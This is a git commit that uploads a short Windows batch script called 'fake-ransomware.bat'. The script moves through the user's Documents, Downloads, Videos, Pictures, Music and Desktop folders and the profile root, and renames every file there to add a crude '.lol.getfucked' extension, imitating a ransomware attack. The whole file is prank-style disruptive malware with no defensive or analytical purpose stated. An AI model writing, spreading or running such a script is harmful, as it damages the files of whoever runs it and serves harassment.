5c2a19177e50bb743b74c3cb50eda09cb22ed463
codingcoderwhat <37680195+codingcoderwhat@users.noreply.github.com>
2018-11-06 10:23:06 -0500

    Add files via upload

---
+++ fake-ransomware.bat
@@ -0,0 +1,25 @@
+@ECHO OFF 
+cd \
+cd %userprofile%
+cd Documents
+ren *.* *.lol.getfucked
+cd .. 
+cd Downloads
+ren *.* *.lol.getfucked
+cd ..
+cd Videos
+ren *.* *.lol.getfucked
+cd ..
+cd Pictures
+ren *.* *.lol.getfucked
+cd ..
+cd Music
+ren *.* *.lol.getfucked
+cd ..
+cd  Desktop
+ren *.* *.lol.getfucked
+cd ..
+ren *.* *.lol.getfucked
+
+
+
